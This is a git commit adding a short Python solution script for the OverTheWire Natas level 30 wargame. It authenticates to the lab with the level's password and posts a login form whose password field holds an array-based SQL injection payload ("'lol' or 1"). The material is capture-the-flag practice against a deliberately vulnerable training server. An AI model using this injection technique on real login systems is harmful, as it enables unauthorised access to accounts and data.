93583a05ab98deda09d2d5d281bb2b8621003be7
eyobs <ttoeyob@gmail.com>
2019-11-27 10:26:45 +0300

    30

---
+++ overthewire/Natas/natas30f/req.py
@@ -0,0 +1,24 @@
+import requests
+import urllib
+import base64
+
+
+# proxies = {
+#  "http": "http://127.0.0.1:8099",
+# }
+
+
+url = "http://natas30.natas.labs.overthewire.org"
+s = requests.Session()
+
+s.proxies = {
+ "http": "http://127.0.0.1:8099",
+}
+
+
+s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
+
+
+params={"username": "valid_username", "password": ["'lol' or 1", 2]}
+print(s.post(url, data=params).text)
+
